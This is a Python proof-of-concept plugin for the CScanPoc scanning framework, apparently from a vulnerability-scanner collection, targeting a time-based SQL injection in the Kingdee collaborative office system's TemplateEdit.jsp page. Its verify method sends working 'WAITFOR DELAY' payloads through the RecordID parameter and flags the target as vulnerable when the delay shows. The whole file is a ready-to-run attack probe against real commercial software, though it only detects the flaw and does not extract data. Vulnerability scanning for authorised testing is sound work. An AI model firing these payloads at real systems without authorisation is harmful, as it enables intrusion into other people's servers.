# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'kingdee_0012' # 平台漏洞编号，留空
    name = '金蝶协作办公系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-11-22'  # 漏洞公布时间
    desc = '''
        金蝶协作办公系统 TemplateEdit.jsp 参数过滤不完整导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://www.hackdig.com/11/hack-28820.htm'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '金蝶协作办公系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'e8c91dce-e299-4c09-884a-4c96f22b434a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            payload0 = "/kingdee/Template/TemplateEdit.jsp?RecordID=1';%20WAITFOR%20DELAY%20'0:0:0'--"
            t0 = time.time()
            code0, _, _, _, _ = hh.http(self.target + payload0)
            t0_end = time.time() - t0
            payload5 = "/kingdee/Template/TemplateEdit.jsp?RecordID=1';%20WAITFOR%20DELAY%20'0:0:5'--"
            t5 = time.time()
            code5, _, _, _, _ = hh.http(self.target + payload5)
            t5_end = time.time() - t5
            if code0 == 200 and code5 == 200 and t5_end-t0_end > 4.5:
                #security_hole(self.target + payload5)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
